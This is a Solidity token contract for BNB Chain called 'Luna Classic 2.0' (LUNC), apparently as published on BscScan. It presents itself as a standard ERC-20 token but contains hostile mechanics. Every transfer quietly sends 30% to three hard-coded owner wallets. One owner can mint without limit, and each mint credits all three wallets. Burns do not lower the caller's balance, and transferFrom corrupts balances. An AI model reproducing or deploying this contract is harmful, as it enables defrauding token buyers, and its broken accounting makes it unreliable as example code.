/**
 *Submitted for verification at BscScan.com on 2022-05-27
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity = 0.8.14;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Token is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address payable private owner1 = payable(0x86ceA614Ab88F0cf99A27D4ecb3C5ed6A5b1Cc06);
    address payable private owner2 = payable(0xf1ec20881DcAB5Fb4E69F9467A6f07572e58988e);
    address payable private owner3 = payable(0x6605B92DF678aC0D933Acf28a21014E34b3D6687);
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping (address => uint256)) public allowance;

    constructor() {
        name = "Luna Classic 2.0";
        symbol = "LUNC";
        decimals = 18;
        uint256 _initialSupply = 3000000 * 10 ** decimals;

        balanceOf[owner1] = _initialSupply / 3;
        balanceOf[owner2] = _initialSupply / 3;
        balanceOf[owner3] = _initialSupply / 3;
        totalSupply = _initialSupply;

        emit Transfer(address(0), msg.sender, _initialSupply);
    }

    // function getOwner() public view returns (address) {
    //     return owner;
    // }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        uint256 senderBalance = balanceOf[msg.sender];
        uint256 receiverBalance = balanceOf[_to];
                    
        require(_to != address(0), "Receiver address invalid");
        require(_value >= 0, "Value must be greater or equal to 0");
        require(senderBalance > _value, "Not enough balance");

        balanceOf[msg.sender] = senderBalance - _value;

        uint256 _distributed_value = _value * 30 / 100;
        _value = _value - _distributed_value; // 70%

        balanceOf[owner1] = balanceOf[owner1] + (_distributed_value * 34 / 100);
        balanceOf[owner2] = balanceOf[owner2] + (_distributed_value * 33 / 100);
        balanceOf[owner3] = balanceOf[owner3] + (_distributed_value * 33 / 100);

        balanceOf[_to] = receiverBalance + _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 senderBalance = balanceOf[msg.sender];
        uint256 fromAllowance = allowance[_from][msg.sender];
        uint256 receiverBalance = balanceOf[_to];

        require(_to != address(0), "Receiver address invalid");
        require(_value >= 0, "Value must be greater or equal to 0");
        require(senderBalance > _value, "Not enough balance");
        require(fromAllowance >= _value, "Not enough allowance");

        balanceOf[_from] = senderBalance - _value;

        uint256 _total_value = _value;
        uint256 _distributed_value = _value * 30 / 100;
        _value = _value - _distributed_value; // 70%

        balanceOf[owner1] = balanceOf[owner1] + (_distributed_value * 34 / 100);
        balanceOf[owner2] = balanceOf[owner2] + (_distributed_value * 33 / 100);
        balanceOf[owner3] = balanceOf[owner3] + (_distributed_value * 33 / 100);

        balanceOf[_to] = receiverBalance + _value; 
        allowance[_from][msg.sender] = fromAllowance - _total_value;

        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_value > 0, "Value must be greater than 0");

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function mint(uint256 _amount) public returns (bool success) {
        require(msg.sender == owner1, "Operation unauthorised");

        totalSupply += _amount;
        balanceOf[owner1] += _amount;
        balanceOf[owner2] += _amount;
        balanceOf[owner3] += _amount;

        emit Transfer(address(0), msg.sender, _amount);
        return true;
    }

    function burn(uint256 _amount) public returns (bool success) {
      require(msg.sender != address(0), "Invalid burn recipient");

      uint256 accountBalance = balanceOf[msg.sender];
      require(accountBalance > _amount, "Burn amount exceeds balance");

      
    //   balanceOf[owner1] -= _amount;
    //   balanceOf[owner2] -= _amount;
    //   balanceOf[owner3] -= _amount;
      totalSupply -= _amount;

      emit Transfer(msg.sender, address(0), _amount);
      return true;
    }
}